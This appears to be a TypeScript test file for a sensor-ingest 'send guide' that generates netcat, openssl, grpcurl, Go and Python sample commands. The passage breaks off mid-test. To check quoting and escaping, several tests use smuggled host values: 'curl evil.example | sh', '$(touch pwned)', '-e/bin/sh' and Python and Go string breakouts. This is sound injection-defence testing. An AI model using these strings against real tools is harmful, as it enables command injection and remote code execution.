import { Feed } from '../../shared/models/feed.model';
import {
  COUNTERS,
  FRAMING_NOTES,
  INGEST_PROTO_FILES,
  PROTO_FILES,
  SendTarget,
  endpointLabel,
  ewSensorCommand,
  sensorSimCommand,
  goSnippet,
  grpcTarget,
  grpcurlCommand,
  impliedFraming,
  jsonBatchExample,
  jsonExample,
  netcatCommand,
  protobufExamplesFit,
  pythonSnippet,
  examplesNote,
  sendTarget,
  senderTime,
  shellQuote,
  tlsTestCommand,
} from './send-guide';

const feed = (driver: string, config: Record<string, unknown>, detail: Record<string, unknown> = {}) =>
  ({ id: 'f', name: 'F', driver, config, status: { detail } }) as Feed;

/** A target spelled out in full, so each test names only what it is about. */
const target = (over: Partial<SendTarget> = {}): SendTarget => ({
  mode: 'listen',
  protocol: 'tcp',
  host: 'h',
  port: 6000,
  format: 'sentinel',
  encoding: 'protobuf',
  framing: 'delimited',
  tls: false,
  requireClientCert: false,
  allow: [],
  ...over,
});

const jsonTarget = (over: Partial<SendTarget> = {}) => target({ encoding: 'json', framing: 'line', ...over });

describe('send guide', () => {
  it('reads listen targets from the health detail and the config', () => {
    const t = sendTarget(feed('tcp', { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true, requireClientCert: true } }, { listen: { protocol: 'tcp', host: 'sentinel.example', port: 6000 } }))!;
    expect(t).toEqual({
      mode: 'listen',
      protocol: 'tcp',
      host: 'sentinel.example',
      port: 6000,
      format: 'sentinel',
      encoding: 'json',
      framing: 'line',
      tls: true,
      requireClientCert: true,
      allow: [],
    });
    expect(endpointLabel(t)).toBe('sentinel.example:6000/tcp');
    // Not running yet: the port from the config, no host.
    expect(sendTarget(feed('udp', { port: 10110 }))).toEqual(expect.objectContaining({ protocol: 'udp', host: '', port: 10110, encoding: 'protobuf' }));
    expect(sendTarget(feed('tcp', { mode: 'connect', host: 'feeds.example', port: 7000 }))).toEqual(expect.objectContaining({ mode: 'connect', host: 'feeds.example', port: 7000 }));
    expect(sendTarget(feed('opensky', {}))).toBeNull();
  });

  it('reads the allowlist from the config', () => {
    const t = sendTarget(feed('tcp', { mode: 'listen', port: 6000, allow: ['10.0.0.0/8', 5, '192.168.1.5'], tls: { enabled: true } }))!;
    expect(t.allow).toEqual(['10.0.0.0/8', '192.168.1.5']);
    expect(sendTarget(feed('udp', { port: 1, allow: 'anyone' }))!.allow).toEqual([]);
    // Datagrams have no TLS, whatever a stray key says.
    expect(sendTarget(feed('udp', { port: 1, tls: { enabled: true } }))!.tls).toBe(false);
    // A client certificate is asked for by a TLS listener only.
    const noTls = sendTarget(feed('tcp', { mode: 'listen', port: 1, tls: { enabled: false, requireClientCert: true } }))!;
    expect([noTls.tls, noTls.requireClientCert]).toEqual([false, false]);
    // An empty format is the default one.
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 1, format: '' }))!.format).toBe('sentinel');
  });

  it('a listener guide names the listener host, whatever tls.serverName holds', () => {
    // tls.serverName is what Sentinel checks when it dials out; a listener ignores it. A connection
    // switched from connect to listen keeps it, and it must not reach a sample, least of all a
    // command someone copies into a shell.
    const stale = 'x; curl evil.example | sh';
    const config = { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true, requireClientCert: true, serverName: stale } };
    const running = sendTarget(feed('tcp', config, { listen: { protocol: 'tcp', host: 'sentinel.example', port: 6000 } }))!;

    const samples = { openssl: tlsTestCommand(running)!, go: goSnippet(running), python: pythonSnippet(running) };
    for (const [name, sample] of Object.entries(samples)) {
      expect([name, sample.includes('curl'), sample.includes('evil')]).toEqual([name, false, false]);
    }
    expect(samples.openssl).toContain('-connect sentinel.example:6000 -servername sentinel.example -verify_hostname sentinel.example -CAfile ca.pem');
    expect(samples.go).toContain('ServerName: "sentinel.example"');
    expect(samples.python).toContain('server_hostname="sentinel.example"');

    // Before it runs there is no host, so the placeholder is the name, not the stale setting.
    const waiting = sendTarget(feed('tcp', config))!;
    expect(tlsTestCommand(waiting)).toContain('-servername LISTENER_HOST -verify_hostname LISTENER_HOST');
    expect(goSnippet(waiting)).toContain('ServerName: "LISTENER_HOST"');
    expect(pythonSnippet(waiting)).toContain('server_hostname="LISTENER_HOST"');
  });

  it('derives framing from detail, then config, then the format', () => {
    // A running connection reports what it uses.
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 6000, framing: 'line' }, { framing: 'lengthprefix' }))!.framing).toBe('lengthprefix');
    expect(sendTarget(feed('udp', { port: 1 }, { framing: 'line' }))!.framing).toBe('line');
    // Not running yet: the override in the config.
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 6000, framing: 'lengthprefix' }))!.framing).toBe('lengthprefix');
    expect(sendTarget(feed('tcp', { mode: 'connect', host: 'h', port: 1, format: 'nmea-ais', framing: 'lengthprefix' }))!.framing).toBe('lengthprefix');
    // UDP has no framing option; a stray key does not count.
    expect(sendTarget(feed('udp', { port: 1, framing: 'delimited' }))!.framing).toBe('message');
    // Otherwise whatever the format implies.
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 6000 }))!.framing).toBe('delimited');
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 6000, encoding: 'json' }))!.framing).toBe('line');
    expect(sendTarget(feed('tcp', { mode: 'listen', port: 6000, format: 'cot' }))!.framing).toBe('xmlevent');
    expect(sendTarget(feed('udp', { port: 1, format: 'cot' }))!.framing).toBe('message');

    // The same table as the server's tcp.FramingFor and udp.framingFor.
    const implied = (protocol: 'tcp' | 'udp', format: string, encoding: 'protobuf' | 'json') => impliedFraming(protocol, format, encoding);
    expect(['sentinel', ''].map((f) => implied('tcp', f, 'protobuf'))).toEqual(['delimited', 'delimited']);
    expect(['sentinel', ''].map((f) => implied('tcp', f, 'json'))).toEqual(['line', 'line']);
    expect(['cot', 'beast', 'nmea-ais', 'nmea-gps', 'sbs', 'link16', 'json'].map((f) => implied('tcp', f, 'protobuf'))).toEqual(['xmlevent', 'beast', 'line', 'line', 'line', 'line', 'line']);
    expect(['sentinel', ''].map((f) => implied('udp', f, 'protobuf'))).toEqual(['message', 'message']);
    expect(['sentinel', ''].map((f) => implied('udp', f, 'json'))).toEqual(['line', 'line']);
    expect(['cot', 'link16', 'nmea-ais', 'nmea-gps', 'sbs', 'json'].map((f) => implied('udp', f, 'protobuf'))).toEqual(['message', 'message', 'line', 'line', 'line', 'line']);
    // The encoding means something to the sentinel format only.
    expect(implied('tcp', 'cot', 'json')).toBe('xmlevent');
    expect(implied('udp', 'cot', 'json')).toBe('message');
  });

  it('describes every framing the server has', () => {
    expect(Object.keys(FRAMING_NOTES).sort()).toEqual(['beast', 'delimited', 'lengthprefix', 'line', 'message', 'xmlevent']);
    for (const note of Object.values(FRAMING_NOTES)) {
      expect(note.length).toBeGreaterThan(10);
    }
  });

  it('fits protobuf examples only to delimited TCP and whole-datagram UDP', () => {
    expect(protobufExamplesFit(target())).toBe(true);
    expect(protobufExamplesFit(target({ tls: true, requireClientCert: true }))).toBe(true);
    expect(protobufExamplesFit(target({ protocol: 'udp', framing: 'message' }))).toBe(true);
    // The examples write a protobuf varint length, or a whole datagram: nothing else.
    expect(protobufExamplesFit(target({ framing: 'lengthprefix' }))).toBe(false);
    expect(protobufExamplesFit(target({ framing: 'line' }))).toBe(false);
    expect(protobufExamplesFit(target({ protocol: 'udp', framing: 'line' }))).toBe(false);
    expect(protobufExamplesFit(target({ protocol: 'udp', framing: 'delimited' }))).toBe(false);
    expect(protobufExamplesFit(target({ protocol: 'tcp', framing: 'message' }))).toBe(false);
    // JSON and the device formats are not Sentinel's protobuf.
    expect(protobufExamplesFit(jsonTarget())).toBe(false);
    expect(protobufExamplesFit(target({ format: 'cot', framing: 'xmlevent' }))).toBe(false);
  });

  it('says why a connection has no Go or Python examples', () => {
    expect(examplesNote(target())).toBe('');
    expect(examplesNote(target({ protocol: 'udp', framing: 'message' }))).toBe('');
    expect(examplesNote(jsonTarget())).toMatch(/binary protobuf/);
    expect(examplesNote(target({ framing: 'lengthprefix' }))).toContain('lengthprefix');
    expect(examplesNote(target({ framing: 'lengthprefix' }))).toContain(FRAMING_NOTES['lengthprefix']);
    const device = examplesNote(target({ format: 'nmea-gps', framing: 'line', port: 10110, protocol: 'udp' }));
    expect(device).toContain('nmea-gps');
    expect(device).toContain('h:10110/udp');
  });

  it('offers netcat only for plain JSON lines, and snippets per protocol', () => {
    const udpJson = jsonTarget({ protocol: 'udp', host: 'h', port: 10110 });
    expect(netcatCommand(udpJson)).toBe(`echo '${jsonExample()}' | nc -u -w1 h 10110`);
    const tcpJson = jsonTarget({ port: 10110 });
    expect(netcatCommand(tcpJson)).toBe(`echo '${jsonExample()}' | nc -w1 h 10110`);
    // A listener that has not started has no host yet: say where it goes.
    expect(netcatCommand({ ...tcpJson, host: '' })).toBe(`echo '${jsonExample()}' | nc -w1 LISTENER_HOST 10110`);
    expect(netcatCommand({ ...tcpJson, encoding: 'protobuf', framing: 'delimited' })).toBeNull();
    expect(netcatCommand({ ...tcpJson, tls: true })).toBeNull();
    // A line is only a message when the framing says so.
    expect(netcatCommand({ ...tcpJson, framing: 'lengthprefix' })).toBeNull();
    expect(netcatCommand({ ...tcpJson, format: 'cot', framing: 'xmlevent' })).toBeNull();
    expect(netcatCommand({ ...tcpJson, mode: 'connect' })).toBeNull();
    expect(JSON.parse(jsonExample()).sourceEntityId).toBeTruthy();
    // The same line may carry up to 100 observations as an array.
    const batch = JSON.parse(jsonBatchExample());
    expect(Array.isArray(batch)).toBe(true);
    expect(batch.length).toBeGreaterThan(1);
    expect(batch.length).toBeLessThanOrEqual(100);
    expect(batch[0]).toEqual(JSON.parse(jsonExample()));
    expect(jsonBatchExample()).not.toContain('\n');
    expect(goSnippet(target())).toContain('protodelim.MarshalTo');
    expect(goSnippet(target({ protocol: 'udp', framing: 'message' }))).toContain('net.Dial("udp"');
    expect(pythonSnippet(target())).toContain('varint(len(data)) + data');
    expect(PROTO_FILES).toEqual(['observation.proto', 'common.proto', 'entity.proto', 'platform.proto', 'emplacement.proto']);
  });

  it('puts an IPv6 host in brackets where an address is written', () => {
    expect(endpointLabel(target({ host: '2001:db8::1' }))).toBe('[2001:db8::1]:6000/tcp');
    expect(endpointLabel(target({ host: '' }))).toBe('listener:6000/tcp');
    expect(goSnippet(target({ host: '2001:db8::1' }))).toContain('net.Dial("tcp", "[2001:db8::1]:6000")');
    // The brackets are a shell pattern (zsh refuses an unquoted one), so the address is quoted.
    expect(tlsTestCommand(jsonTarget({ tls: true, host: '2001:db8::1' }))).toContain("-connect '[2001:db8::1]:6000' -servername 2001:db8::1 -verify_ip 2001:db8::1");
  });

  describe('gRPC', () => {
    it('reads the endpoint from the health detail, then the config', () => {
      const t = grpcTarget(feed('grpc', { port: 6200, allow: ['10.0.0.0/8'] }, { listen: { host: 'listener.example', port: 6200 } }));
      expect(t).toEqual({ host: 'listener.example', port: 6200, tls: false, requireClientCert: false, allow: ['10.0.0.0/8'] });
      expect(grpcTarget(feed('grpc', { port: 6201 }, {}))?.port).toBe(6201);
      expect(grpcTarget(feed('tcp', { mode: 'listen', port: 6000 }, {}))).toBeNull();
    });

    it('builds a grpcurl call to GetSession with the token header', () => {
      const plain = grpcurlCommand({ host: 'listener.example', port: 6200, tls: false, requireClientCert: false, allow: [] });
      expect(plain).toContain('-plaintext');
      expect(plain).toContain('-H "authorization: Bearer $SENTINEL_INGEST_TOKEN"');
      expect(plain).toContain('listener.example:6200');
      expect(plain).toContain('sentinel.ingest.v1.IngestService/GetSession');
      expect(plain).toContain('-proto sentinel/ingest/v1/ingest_service.proto');
      const mtls = grpcurlCommand({ host: 'listener.example', port: 6200, tls: true, requireClientCert: true, allow: [] });
      expect(mtls).not.toContain('-plaintext');
      expect(mtls).toContain('-cacert ca.pem');
      expect(mtls).toContain('-cert client.pem -key client-key.pem');
      // TLS without client certificates trusts the CA and presents nothing
      const tlsOnly = grpcurlCommand({ host: 'listener.example', port: 6200, tls: true, requireClientCert: false, allow: [] });
      expect(tlsOnly).toContain('-cacert ca.pem');
      expect(tlsOnly).not.toContain('-cert ');
      expect(tlsOnly).not.toContain('-plaintext');
    });

    it('builds the ew-sensor command line', () => {
      expect(ewSensorCommand({ host: 'listener.example', port: 6200, tls: false, requireClientCert: false, allow: [] }))
        .toBe('ew-sensor --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --insecure --config examples/coastal-esm.yaml');
      expect(ewSensorCommand({ host: '', port: 6200, tls: true, requireClientCert: false, allow: [] }))
        .toBe('ew-sensor --addr listener:6200 --token "$SENTINEL_INGEST_TOKEN" --tls --ca ca.pem --config examples/coastal-esm.yaml');
      expect(ewSensorCommand({ host: 'listener.example', port: 6200, tls: true, requireClientCert: true, allow: [] }))
        .toBe('ew-sensor --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --tls --ca ca.pem --cert client.pem --key client-key.pem --config examples/coastal-esm.yaml');
    });

    it('builds the sensor-sim command line for each kind', () => {
      const plain = { host: 'listener.example', port: 6200, tls: false, requireClientCert: false, allow: [] };
      expect(sensorSimCommand(plain, 'radar'))
        .toBe('sensor-sim --kind radar --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --insecure --config examples/radar.yaml');
      expect(sensorSimCommand(plain, 'eoir'))
        .toBe('sensor-sim --kind eoir --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --insecure --config examples/camera.yaml');
      expect(sensorSimCommand({ ...plain, host: '', tls: true }, 'eoir'))
        .toBe('sensor-sim --kind eoir --addr listener:6200 --token "$SENTINEL_INGEST_TOKEN" --tls --ca ca.pem --config examples/camera.yaml');
      expect(sensorSimCommand({ ...plain, tls: true, requireClientCert: true }, 'radar'))
        .toBe('sensor-sim --kind radar --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --tls --ca ca.pem --cert client.pem --key client-key.pem --config examples/radar.yaml');
      expect(sensorSimCommand({ ...plain, host: '::1' }, 'radar')).toContain(`--addr '[::1]:6200' `);
    });

    it('brackets an IPv6 listener host and quotes it for the shell', () => {
      const v6 = { host: '::1', port: 6200, tls: false, requireClientCert: false, allow: [] };
      expect(grpcurlCommand(v6)).toContain(` ${shellQuote('[::1]:6200')} `);
      expect(grpcurlCommand(v6)).toContain(`'[::1]:6200'`);
      expect(ewSensorCommand(v6)).toContain(`--addr '[::1]:6200' `);
      // a host that is not a plain name cannot start a second command
      expect(grpcurlCommand({ ...v6, host: 'x; id' })).toContain(`'x; id:6200'`);
    });

    it('serves the ingest contract next to the observation protos', () => {
      expect(INGEST_PROTO_FILES).toEqual(['sentinel/ingest/v1/ingest_service.proto']);
      expect(PROTO_FILES).not.toEqual(expect.arrayContaining(INGEST_PROTO_FILES));
    });
  });

  describe('Go', () => {
    /** The paths an import block lists, aliases dropped. */
    const importsOf = (src: string): string[] => {
      const block = /^import \(\n([\s\S]*?)\n\)/m.exec(src)?.[1] ?? '';
      return block
        .split('\n')
        .map((line) => line.trim().replace(/^\w+\s+/, '').replace(/"/g, ''))
        .filter(Boolean);
    };
    const body = (src: string) => src.slice(src.indexOf('func main()'));
    const PB = 'google.golang.org/protobuf';
    const SENTINEL = 'example.com/yourapp/sentinel/v1';

    it('writes a complete Go program per transport', () => {
      const tcp = goSnippet(target());
      expect(tcp).toContain('package main');
      expect(tcp).toContain('func main() {');
      expect(tcp).toContain('protoc --go_out=. --go_opt=paths=source_relative sentinel/v1/*.proto');
      expect(tcp).toContain(`import sentinelv1 "${SENTINEL}"`);
      expect(importsOf(tcp)).toEqual(['log', 'net', `${PB}/encoding/protodelim`, SENTINEL]);
      expect(tcp).toContain('net.Dial("tcp", "h:6000")');
      expect(tcp).toContain('protodelim.MarshalTo(conn, obs)');
      expect(tcp).not.toContain('tls.');

      const udp = goSnippet(target({ protocol: 'udp', framing: 'message' }));
      expect(importsOf(udp)).toEqual(['log', 'net', `${PB}/proto`, SENTINEL]);
      expect(udp).toContain('net.Dial("udp", "h:6000")');
      // proto.Marshal's error is checked, not thrown away.
      expect(udp).toMatch(/data, err := proto\.Marshal\(obs\)\n\tif err != nil \{\n\t\tlog\.Fatal\(err\)/);
      expect(udp).not.toContain('protodelim');

      const tls = goSnippet(target({ tls: true }));
      expect(importsOf(tls)).toEqual(['crypto/tls', 'crypto/x509', 'log', 'os', `${PB}/encoding/protodelim`, SENTINEL]);
      expect(tls).not.toContain('"net"');
      expect(tls).toContain('tls.Dial("tcp", "h:6000", cfg)');
      expect(tls).toContain('ServerName: "h"');
      expect(tls).toContain('os.ReadFile("ca.pem")');
      expect(tls).toContain('AppendCertsFromPEM(ca)');
      expect(tls).toContain('protodelim.MarshalTo(conn, obs)');
    });

    it('loads a client certificate only when the listener requires one', () => {
      expect(goSnippet(target({ tls: true }))).not.toContain('LoadX509KeyPair');
      expect(goSnippet(target({ tls: true }))).not.toContain('cfg.Certificates');
      const mtls = goSnippet(target({ tls: true, requireClientCert: true }));
      expect(mtls).toContain('tls.LoadX509KeyPair("client.pem", "client.key")');
      expect(mtls).toContain('cfg.Certificates = []tls.Certificate{cert}');
      // The certificate is loaded before the dial that presents it.
      expect(mtls.indexOf('LoadX509KeyPair')).toBeLessThan(mtls.indexOf('tls.Dial'));
    });

    it('uses every import it declares and none it leaves out', () => {
      const variants = [
        target(),
        target({ tls: true }),
        target({ tls: true, requireClientCert: true }),
        target({ protocol: 'udp', framing: 'message' }),
        target({ host: '' }),
      ];
      for (const t of variants) {
        const src = goSnippet(t);
        // A program, not a fragment: there is something to compare.
        expect(src).toContain('func main()');
        expect(importsOf(src).length).toBeGreaterThan(2);
        // Selectors in code only: not words in a comment or a file name in a string.
        const code = body(src).replace(/\/\/.*$/gm, '').replace(/"[^"]*"/g, '""');
        const used = new Set(Array.from(code.matchAll(/\b([a-z][a-z0-9]*)\./g), (m) => m[1]));
        const qualifier = (path: string) => (path === SENTINEL ? 'sentinelv1' : path.split('/').pop()!);
        const declared = new Set(importsOf(src).map(qualifier));
        // A selector on a local value (conn.Close, cfg.Certificates) is not a package.
        const locals = new Set(['conn', 'cfg', 'roots', 'obs']);
        const packages = new Set([...used].filter((name) => !locals.has(name)));
        expect([...declared].sort()).toEqual([...packages].sort());
      }
    });

    it('verifies the certificate for the listener host, with a placeholder while it is unknown', () => {
      expect(goSnippet(target({ host: '' }))).toContain('net.Dial("tcp", "LISTENER_HOST:6000")');
      const tls = goSnippet(target({ tls: true }));
      expect(tls).toContain('ServerName: "h"');
      expect(tls).toContain('tls.Dial("tcp", "h:6000", cfg)');
      expect(goSnippet(target({ tls: true, host: '' }))).toContain('ServerName: "LISTENER_HOST"');
    });

    it('is laid out as gofmt does: tabs for indents, no doc comment before the package clause', () => {
      for (const src of [goSnippet(target()), goSnippet(target({ tls: true, requireClientCert: true })), goSnippet(target({ protocol: 'udp', framing: 'message' }))]) {
        expect(src).not.toMatch(/^ +\S/m);
        expect(src).toMatch(/\n\n(?=package main\n)/);
        expect(src).toContain('\n\tobs := &sentinelv1.Observation{\n\t\tSourceEntityId: "example-1",\n\t\tEntityType:     sentinelv1.EntityType_ENTITY_TYPE_VEHICLE,');
      }
    });
  });

  describe('Python', () => {
    it('Python uses its own varint and ssl for TLS', () => {
      const plain = pythonSnippet(target());
      expect(plain).not.toContain('_VarintBytes');
      // A runtime older than the protoc that wrote the code refuses to load it.
      expect(plain).toContain('pip install -U protobuf');
      expect(plain).toContain('def varint(n):');
      expect(plain).toContain('from sentinel.v1 import entity_pb2, observation_pb2');
      expect(plain).toContain('entity_type=entity_pb2.ENTITY_TYPE_VEHICLE');
      expect(plain).toContain('socket.create_connection(("h", 6000))');
      expect(plain).not.toContain('ssl');

      const tls = pythonSnippet(target({ tls: true }));
      expect(tls).toContain('import ssl');
      // Closing a TLS 1.3 connection at once can reset it and lose the message; plain TCP needs no wait.
      expect(tls).toContain('time.sleep(0.5)');
      expect(tls).toContain('import time');
      expect(plain).not.toContain('time.sleep');
      expect(pythonSnippet(target({ tls: true, requireClientCert: true }))).toContain('time.sleep(0.5)');
      expect(tls).toContain('ssl.create_default_context(cafile="ca.pem")');
      expect(tls).toContain('ctx.wrap_socket(raw, server_hostname="h")');
      expect(tls).toContain('def varint(n):');
      expect(tls).not.toContain('load_cert_chain');

      const mtls = pythonSnippet(target({ tls: true, requireClientCert: true }));
      expect(mtls).toContain('ctx.load_cert_chain("client.pem", "client.key")');
      expect(mtls.indexOf('load_cert_chain')).toBeLessThan(mtls.indexOf('wrap_socket'));

      expect(pythonSnippet(target({ host: '' }))).toContain('("LISTENER_HOST", 6000)');
    });

    it('sends a UDP datagram as one whole message with no length prefix', () => {
      const udp = pythonSnippet(target({ protocol: 'udp', framing: 'message', port: 10110 }));
      // The first address getaddrinfo finds, so an IPv6 listener works as well as an IPv4 one.
      expect(udp).toContain('family, socktype, proto, _, addr = socket.getaddrinfo("h", 10110, type=socket.SOCK_DGRAM)[0]');
      expect(udp).toContain('with socket.socket(family, socktype, proto) as s:');
      expect(udp).toContain('s.sendto(data, addr)');
      expect(udp).not.toContain('AF_INET');
      expect(pythonSnippet(target({ protocol: 'udp', framing: 'message', host: '2001:db8::1' }))).toContain('socket.getaddrinfo("2001:db8::1", 6000, type=socket.SOCK_DGRAM)');
      expect(udp).not.toContain('varint');
      expect(udp).not.toContain('ssl');
    });
  });

  it('checks an IP listener by address and a named one by name', () => {
    const verify = (host: string) => /-verify_(hostname|ip) (\S+)/.exec(tlsTestCommand(jsonTarget({ tls: true, host }))!)!.slice(1);
    expect(verify('10.0.0.5')).toEqual(['ip', '10.0.0.5']);
    expect(verify('2001:db8::1')).toEqual(['ip', '2001:db8::1']);
    expect(verify('::1')).toEqual(['ip', '::1']);
    // names that only look like addresses are names
    for (const name of ['sentinel.example', '10.0.0.256', '1.2.3', '10.0.0.5.example', 'a:b', 'LISTENER_HOST']) {
      expect(verify(name)[0]).toBe('hostname');
    }
    expect(tlsTestCommand(jsonTarget({ tls: true, host: '' }))).toContain('-verify_hostname LISTENER_HOST');
  });

  it('tests TLS JSON with openssl', () => {
    const base = `echo '${jsonExample()}' | openssl s_client -quiet -no_ign_eof -verify_return_error -connect h:6000 -servername h -verify_hostname h -CAfile ca.pem`;
    expect(tlsTestCommand(jsonTarget({ tls: true }))).toBe(base);
    // Client certificate flags only when the listener asks for one.
    expect(tlsTestCommand(jsonTarget({ tls: true, requireClientCert: true }))).toBe(`${base} -cert client.pem -key client.key`);
    expect(tlsTestCommand(jsonTarget({ tls: true, host: '' }))).toContain('-connect LISTENER_HOST:6000 -servername LISTENER_HOST -verify_hostname LISTENER_HOST');
    // Only JSON lines over TCP with TLS.
    expect(tlsTestCommand(jsonTarget({ tls: true, protocol: 'udp' }))).toBeNull();
    expect(tlsTestCommand(target({ tls: true }))).toBeNull();
    expect(tlsTestCommand(jsonTarget({ tls: true, format: 'nmea-gps' }))).toBeNull();
    expect(tlsTestCommand(jsonTarget({ tls: true, framing: 'lengthprefix' }))).toBeNull();
    expect(tlsTestCommand(jsonTarget())).toBeNull();
    expect(tlsTestCommand(jsonTarget({ tls: true, mode: 'connect' }))).toBeNull();
  });

  describe('values a sample puts in code', () => {
    const quoted = `'${jsonExample()}'`;

    it('single-quotes a shell word unless it is plainly safe', () => {
      for (const safe of ['h', 'localhost', 'sentinel.example', '10.0.0.5', '2001:db8::1', 'LISTENER_HOST', 'a-b.c_d', '6000']) {
        expect(shellQuote(safe)).toBe(safe);
      }
      expect(shellQuote('a b')).toBe("'a b'");
      expect(shellQuote('a;b')).toBe("'a;b'");
      expect(shellQuote('$(id)')).toBe("'$(id)'");
      expect(shellQuote('`id`')).toBe("'`id`'");
      expect(shellQuote('')).toBe("''");
      expect(shellQuote('a\nb')).toBe("'a\nb'");
      // The brackets of an IPv6 endpoint are a pattern to a shell.
      expect(shellQuote('[2001:db8::1]:6000')).toBe("'[2001:db8::1]:6000'");
      // A quote ends the quoting, so it is written on its own: ' becomes '\''.
      expect(shellQuote("it's")).toBe("'it'\\''s'");
      expect(shellQuote("'")).toBe("''\\'''");
      expect(shellQuote("''")).toBe("''\\'''\\'''");
    });

    it('quotes the host in the netcat and openssl lines', () => {
      const nc = (host: string, over: Partial<SendTarget> = {}) => netcatCommand(jsonTarget({ host, ...over }));
      expect(nc('h; curl evil.example | sh')).toBe(`echo ${quoted} | nc -w1 'h; curl evil.example | sh' 6000`);
      expect(nc('a b', { protocol: 'udp' })).toBe(`echo ${quoted} | nc -u -w1 'a b' 6000`);
      expect(nc("o'brien")).toBe(`echo ${quoted} | nc -w1 'o'\\''brien' 6000`);
      expect(nc('$(touch pwned)')).toContain("nc -w1 '$(touch pwned)' 6000");
      // An ordinary host, and the placeholder, stay as bare as they were.
      expect(nc('sentinel.example')).toBe(`echo ${quoted} | nc -w1 sentinel.example 6000`);
      expect(nc('')).toBe(`echo ${quoted} | nc -w1 LISTENER_HOST 6000`);

      const openssl = (host: string) => tlsTestCommand(jsonTarget({ tls: true, host }))!;
      expect(openssl('h; curl evil.example | sh')).toBe(
        `echo ${quoted} | openssl s_client -quiet -no_ign_eof -verify_return_error -connect 'h; curl evil.example | sh:6000' -servername 'h; curl evil.example | sh' -verify_hostname 'h; curl evil.example | sh' -CAfile ca.pem`,
      );
      expect(openssl("o'brien")).toContain("-connect 'o'\\''brien:6000' -servername 'o'\\''brien' -verify_hostname 'o'\\''brien' -CAfile");
      expect(openssl('sentinel.example')).toContain('-connect sentinel.example:6000 -servername sentinel.example -verify_hostname sentinel.example');
    });

    it('stops a host that begins with a dash from being read as an option', () => {
      // Quoting does not help here: nc reads '-e/bin/sh' as an option too. "--" ends the options.
      expect(netcatCommand(jsonTarget({ host: '-e/bin/sh' }))).toBe(`echo ${quoted} | nc -w1 -- '-e/bin/sh' 6000`);
      expect(netcatCommand(jsonTarget({ host: '-x', protocol: 'udp' }))).toBe(`echo ${quoted} | nc -u -w1 -- -x 6000`);
      // openssl takes what follows -connect and -servername as its value, whatever it looks like.
      expect(tlsTestCommand(jsonTarget({ tls: true, host: '-x' }))).toContain('-connect -x:6000 -servername -x -verify_hostname -x -CAfile');
      expect(netcatCommand(jsonTarget({ host: 'a-b' }))).not.toContain('--');
    });

    it('writes the host as a Go string literal, as strconv.Quote would', () => {
      const dialArg = (host: string) => /net\.Dial\("tcp", (.*)\)\n/.exec(goSnippet(target({ host })))![1];
      expect(dialArg('sentinel.example')).toBe('"sentinel.example:6000"');
      expect(dialArg('a"b')).toBe('"a\\"b:6000"');
      expect(dialArg('a\\b')).toBe('"a\\\\b:6000"');
      // A newline would end the line, so it is written as an escape.
      expect(dialArg('a\nb')).toBe('"a\\nb:6000"');
      expect(dialArg('a\tb\rc')).toBe('"a\\tb\\rc:6000"');
      expect(dialArg('a\u0001b\u007fc')).toBe('"a\\x01b\\x7fc:6000"');
      expect(dialArg('hé')).toBe('"h\\u00e9:6000"');
      expect(dialArg('h\u{1f600}')).toBe('"h\\U0001f600:6000"');
      // A lone surrogate is not text; the replacement character stands in.
      expect(dialArg('a\ud800b')).toBe('"a\\ufffdb:6000"');
    });

    it('keeps a quote in the host inside the Go string it is written in', () => {
      const host = 'x"); os.Exit(1); ("';
      expect(goSnippet(target({ host }))).toContain('net.Dial("tcp", "x\\"); os.Exit(1); (\\":6000")');
      expect(goSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain('net.Dial("udp", "x\\"); os.Exit(1); (\\":6000")');
      const tls = goSnippet(target({ host, tls: true }));
      expect(tls).toContain('tls.Dial("tcp", "x\\"); os.Exit(1); (\\":6000", cfg)');
      expect(tls).toContain('ServerName: "x\\"); os.Exit(1); (\\""');
    });

    it('writes the host as a Python string literal, as repr would', () => {
      const connectArg = (host: string) => /create_connection\(\((.*), 6000\)\)/.exec(pythonSnippet(target({ host })))![1];
      expect(connectArg('sentinel.example')).toBe('"sentinel.example"');
      expect(connectArg('a"b')).toBe('"a\\"b"');
      expect(connectArg("a'b")).toBe(`"a'b"`);
      expect(connectArg('a\\b')).toBe('"a\\\\b"');
      expect(connectArg('a\nb')).toBe('"a\\nb"');
      expect(connectArg('hé')).toBe('"h\\u00e9"');
      expect(connectArg('h\u{1f600}')).toBe('"h\\U0001f600"');
    });

    it('keeps a quote in the host inside the Python string it is written in', () => {
      const host = 'x", 1); __import__("os").system("id"); ("';
      const literal = '"x\\", 1); __import__(\\"os\\").system(\\"id\\"); (\\""';
      expect(pythonSnippet(target({ host }))).toContain(`socket.create_connection((${literal}, 6000))`);
      expect(pythonSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain(`socket.getaddrinfo(${literal}, 6000, type=socket.SOCK_DGRAM)`);
      const tls = pythonSnippet(target({ host, tls: true }));
      expect(tls).toContain(`socket.create_connection((${literal}, 6000))`);
      expect(tls).toContain(`server_hostname=${literal}`);
    });
  });

  describe('counters', () => {
    const keysFor = (t: SendTarget) => COUNTERS.filter((c) => c.applies(t)).map((c) => c.key);

    it('names and explains every counter, in plain words', () => {
      expect(Object.fromEntries(COUNTERS.map((c) => [c.key, c.label]))).toEqual({
        accepted: 'Accepted',
        rejected: 'Not allowed',
        refused: 'Over connection limit',
        rateLimited: 'Rate limited',
        senderRateLimited: 'Rate limited (per sender)',
        oversize: 'Too large',
        kernelDropped: 'Dropped by the OS',
        tlsFailed: 'TLS failed',
        tlsReloads: 'TLS reloads',
        tlsReloadFailed: 'TLS reload failed',
        malformed: 'Undecodable',
        messages: 'Messages',
        reconnects: 'Reconnects',
      });
      expect(new Set(COUNTERS.map((c) => c.key)).size).toBe(COUNTERS.length);
      for (const c of COUNTERS) {
        expect(c.help.length).toBeGreaterThan(20);
      }
    });

    it('says what the OS drops, and where', () => {
      expect(COUNTERS.find((c) => c.key === 'kernelDropped')!.help).toBe(
